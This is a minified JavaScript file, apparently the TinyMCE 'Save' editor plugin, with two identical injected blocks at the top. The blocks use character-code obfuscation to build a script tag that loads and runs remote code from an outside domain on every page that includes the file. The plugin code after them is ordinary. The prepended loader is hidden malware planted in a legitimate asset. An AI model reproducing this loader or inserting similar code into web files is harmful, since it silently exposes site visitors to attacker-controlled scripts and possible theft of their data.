Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function(){tinymce.create("tinymce.plugins.Save",{init:function(a,b){var c=this;c.editor=a;a.addCommand("mceSave",c._save,c);a.addCommand("mceCancel",c._cancel,c);a.addButton("save",{title:"save.save_desc",cmd:"mceSave"});a.addButton("cancel",{title:"save.cancel_desc",cmd:"mceCancel"});a.onNodeChange.add(c._nodeChange,c);a.addShortcut("ctrl+s",a.getLang("save.save_desc"),"mceSave")},getInfo:function(){return{longname:"Save",author:"Moxiecode Systems AB",authorurl:"http://tinymce.moxiecode.com",infourl:"http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/save",version:tinymce.majorVersion+"."+tinymce.minorVersion}},_nodeChange:function(b,a,c){var b=this.editor;if(b.getParam("save_enablewhendirty")){a.setDisabled("save",!b.isDirty());a.setDisabled("cancel",!b.isDirty())}},_save:function(){var c=this.editor,a,e,d,b;a=tinymce.DOM.get(c.id).form||tinymce.DOM.getParent(c.id,"form");if(c.getParam("save_enablewhendirty")&&!c.isDirty()){return}tinyMCE.triggerSave();if(e=c.getParam("save_onsavecallback")){if(c.execCallback("save_onsavecallback",c)){c.startContent=tinymce.trim(c.getContent({format:"raw"}));c.nodeChanged()}return}if(a){c.isNotDirty=true;if(a.onsubmit==null||a.onsubmit()!=false){a.submit()}c.nodeChanged()}else{c.windowManager.alert("Error: No form element found.")}},_cancel:function(){var a=this.editor,c,b=tinymce.trim(a.startContent);if(c=a.getParam("save_oncancelcallback")){a.execCallback("save_oncancelcallback",a);return}a.setContent(b);a.undoManager.clear();a.nodeChanged()}});tinymce.PluginManager.add("save",tinymce.plugins.Save)})();